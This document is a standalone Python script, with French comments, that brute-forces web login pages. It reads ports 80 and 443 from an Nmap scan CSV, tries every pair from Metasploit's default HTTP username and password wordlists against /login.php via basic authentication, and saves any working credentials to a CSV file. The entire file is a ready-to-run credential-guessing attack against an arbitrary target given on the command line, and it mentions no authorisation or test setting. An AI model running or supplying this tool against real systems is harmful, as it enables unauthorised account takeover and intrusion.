import csv
import requests
from requests.auth import HTTPBasicAuth
import sys

# Chemins vers les fichiers de noms d'utilisateur et de mots de passe prédéfinis
usernames_file = '/usr/share/metasploit-framework/data/wordlists/http_default_users.txt'
passwords_file = '/usr/share/metasploit-framework/data/wordlists/http_default_pass.txt'

# Fonction pour lire les noms d'utilisateur à partir d'un fichier
def load_usernames(file_path):
    """
    Charge les noms d'utilisateur à partir du fichier spécifié.
    
    Args:
        file_path (str): Chemin du fichier contenant les noms d'utilisateur.
        
    Returns:
        list: Liste des noms d'utilisateur.
    """
    with open(file_path, 'r') as f:
        return [line.strip() for line in f.readlines()]

# Fonction pour lire les mots de passe à partir d'un fichier
def load_passwords(file_path):
    """
    Charge les mots de passe à partir du fichier spécifié.
    
    Args:
        file_path (str): Chemin du fichier contenant les mots de passe.
        
    Returns:
        list: Liste des mots de passe.
    """
    with open(file_path, 'r') as f:
        return [line.strip() for line in f.readlines()]

# Fonction principale de brute force sur la page de connexion
def brute_force_login(target_url, usernames, passwords):
    """
    Effectue une attaque brute force sur la page de connexion du serveur cible.
    
    Args:
        target_url (str): URL de la page de connexion.
        usernames (list): Liste des noms d'utilisateur à tester.
        passwords (list): Liste des mots de passe à tester.
    
    Returns:
        list: Liste des tentatives réussies avec les identifiants corrects.
    """
    successful_attempts = []
    for username in usernames:
        for password in passwords:
            # Envoi de la requête POST avec authentification HTTP basique
            response = requests.post(target_url, auth=HTTPBasicAuth(username, password))
            # Vérification du statut de la réponse pour déterminer si l'authentification a réussi
            status = "Succès" if "Login failed" not in response.text and response.status_code == 200 else "Échec"
            print(f"Essai de {username}:{password} => Statut: {status}")
            if status == "Succès":
                successful_attempts.append((username, password, status))
                # Si une tentative réussit, on arrête le brute force pour ce service
                return successful_attempts
    return successful_attempts

# Charger les utilisateurs et mots de passe depuis les fichiers
usernames = load_usernames(usernames_file)
passwords = load_passwords(passwords_file)

# Fonction pour vérifier les ports web ouverts dans le fichier CSV de scan Nmap
def check_for_web_ports(csv_file, target):
    """
    Vérifie les ports HTTP/HTTPS ouverts dans le fichier CSV généré par Nmap.
    
    Args:
        csv_file (str): Chemin du fichier CSV contenant les résultats du scan Nmap.
        target (str): Adresse IP ou DNS de la cible.
        
    Returns:
        list: Liste des URL des services web détectés.
    """
    web_ports = []
    with open(csv_file, 'r') as file:
        reader = csv.DictReader(file)
        for row in reader:
            port = row.get('Port')
            if port == '80' or port == '443':
                # Sélectionner HTTP pour le port 80 et HTTPS pour le port 443
                protocol = 'https' if port == '443' else 'http'
                web_ports.append(f"{protocol}://{target}:{port}")
    return web_ports

# Fonction pour enregistrer les résultats du brute force dans un fichier CSV
def save_results_to_csv(results, output_csv_file):
    """
    Enregistre les résultats du brute force dans un fichier CSV.
    
    Args:
        results (list): Liste des tentatives réussies.
        output_csv_file (str): Chemin du fichier CSV où enregistrer les résultats.
    """
    if results:
        # Si des tentatives ont réussi, les enregistrer
        with open(output_csv_file, 'w', newline='') as csvfile:
            fieldnames = ['Username', 'Password', 'Status']
            writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
            writer.writeheader()
            for username, password, status in results:
                writer.writerow({'Username': username, 'Password': password, 'Status': status})
        print(f"Les résultats du brute force ont été enregistrés dans {output_csv_file}")
    else:
        # Si aucune tentative n'a réussi, enregistrer un message d'échec
        with open(output_csv_file, 'w', newline='') as csvfile:
            writer = csv.writer(csvfile)
            writer.writerow(["Résultat"])
            writer.writerow(["Échec du brute force"])
        print(f"Aucun succès de brute force. Enregistré comme 'Échec du brute force' dans {output_csv_file}")

# Script principal
def main():
    """
    Fonction principale du script qui coordonne le bruteforce en vérifiant d'abord les ports ouverts
    et en tentant ensuite des attaques brute force sur les services web disponibles.
    """
    if len(sys.argv) != 2:
        print("Usage: python3 brute_force.py <target>")
        sys.exit(1)

    # Définir la cible et les fichiers de sortie
    target = sys.argv[1]
    nmap_csv_file = f"nmap_scan_{target.replace('/', '_').replace(':', '_')}.csv"
    output_csv_file = f"brute_force_results_{target.replace('/', '_').replace(':', '_')}.csv"

    # Vérification des ports web disponibles
    web_ports = check_for_web_ports(nmap_csv_file, target)

    if not web_ports:
        print("Aucun port web trouvé pour bruteforce.")
        return

    # Pour chaque port web trouvé, tenter un brute force sur la page de login
    login_page = '/login.php'  # Modifier en fonction de la page de connexion réelle
    for web_port in web_ports:
        full_url = f"{web_port}{login_page}"
        print(f"Essai de brute force sur {full_url}...")
        successful_attempts = brute_force_login(full_url, usernames, passwords)
        save_results_to_csv(successful_attempts, output_csv_file)
        if successful_attempts:
            print(f"Identifiants trouvés: {successful_attempts[0][0]}:{successful_attempts[0][1]}")
            break  # Arrêtez après la première tentative réussie
    else:
        print("Aucun identifiant valide trouvé.")

if __name__ == "__main__":
    main()
